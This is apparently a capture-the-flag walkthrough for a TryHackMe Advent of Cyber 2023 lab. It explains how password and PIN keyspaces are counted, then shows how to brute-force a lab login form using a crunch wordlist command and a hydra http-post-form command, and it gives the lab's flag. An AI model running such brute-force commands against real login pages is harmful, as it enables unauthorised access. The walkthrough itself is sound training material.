# Day 3

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/40a1d025-4fe8-4490-acdd-5bcdf22193f2)

# Scenario

The server room is securely locked, and the team must regain access to recover backup tapes. Brute-forcing the PIN panel stands out as the potential option.

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/be86e8da-1c7a-4a1f-9d83-d0cc82af0cbe)


## Learning Objectives

Upon completing this task, you will gain an understanding of:
    
    - Password complexity and the count of possible combinations.
    - The impact of the number of possible combinations on the feasibility of brute force attacks.
    - Generating password combinations using `crunch`.
    - Automated password trials using `hydra`.

## Feasibility of Brute Force

### Inquiries

    1. How many distinct PIN codes exist?
    2. How many passwords can be generated?
    3. What is the time estimate for finding the password via brute force?

## Counting the PIN Codes

Many systems depend on PIN codes or passwords for user authentication. Without proper security measures, such systems are susceptible to various attacks. Here, we explore brute force attacks, where an adversary systematically tries all possible combinations of a given password.

Consider a scenario where a four-digit PIN code must be selected. The total count would be 10,000 different PIN codes: 0000, 0001, 0002,..., 9998, and 9999. Mathematically, this is 10×10×10×10 or simply 10^4 different PIN codes.

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/6e1c8b72-7e67-4fcb-8f1d-7ad686b1246e)


## Counting the Passwords

Let's imagine a scenario with a four-character password, where each character can be:

    - A digit: We have 10 digits (0 to 9).
    - An uppercase English letter: We have 26 letters (A to Z).
    - A lowercase English letter: We have 26 letters (a to z).

Therefore, each character can be one of 62 different choices. Consequently, for a four-character password, we can create 62×62×62×62 = 62^4 = 14,776,336 different passwords.

To enhance complexity, symbols can be added, expanding the set of choices by more than 30 characters.

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/cebdf03b-911a-4b72-b045-43939842a530)




We can make passwords more secure by increasing the password complexity. This can be achieved by specifying a minimum password length and character variety. For example, the character variety might require at least one uppercase letter, one lowercase letter, one digit, and one symbol.


# Day 3 Tasks:

## 1. Using crunch and hydra, find the PIN code to access the control system and unlock the door. What is the flag?

### PIN Code Retrieval Using crunch and hydra

1. **Objective:** Using `crunch` and `hydra`, discover the PIN code to access the control system and unlock the door. Identify the flag.

2. **Procedure:**
   
         - Navigate to [http://MACHINE-IP:8000/login.php](http://MACHINE-IP:8000/login.php).
         - Identify that the system utilizes a 3-digit password.
         - Generate a password list with `crunch` using the following command:

   ![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/0f48b3f2-5b6d-47da-a8f3-43dcb29aafde)

   
     ```bash
     crunch 3 3 0123456789ABCDEF -o 3digits.txt
     ```
```

╰─ crunch 3 3 0123456789ABCDEF -o 3digits.txt                                             ─╯
Crunch will now generate the following amount of data: 16384 bytes
0 MB
0 GB
0 TB
0 PB
Crunch will now generate the following number of lines: 4096 

crunch: 100% completed generating output
```


## Password Cracking with Hydra

1. **Objective:** Utilize `Hydra` to crack the password using the previously created wordlist and access the control system.

2. **Procedure:**
   - Use the following `hydra` command:
   
     ```bash
     hydra -l '' -P 3digits.txt -f -v MACHINE-IP http-post-form "/login.php:pin=^PASS^:Access denied" -s 8000
     ```
   
   - Explanation of the command:
     - `-l ''`: Specifies an empty username.
     - `-P 3digits.txt`: Specifies the password list generated using `crunch`.
     - `-f`: Stops the attack upon successful password discovery.
     - `-v`: Enables verbose mode.
     - `http-post-form "/login.php:pin=^PASS^:Access denied"`: Defines the login form parameters.
     - `-s 8000`: Specifies the port.

3. **Unlocking the Device:**
   - After obtaining the password, log in using the discovered PIN code.
   - Unlock the device to retrieve the flag.

4. **Flag:**
   - The flag is revealed upon successfully unlocking the device:

![image](https://github.com/W4W1R3/Advent-Of-Cyber-2023-Walkthroughs/assets/57982315/323d8f1d-05e5-40ca-be5d-5150e83e97f2)

        THM{pin-code-brute-force}
    

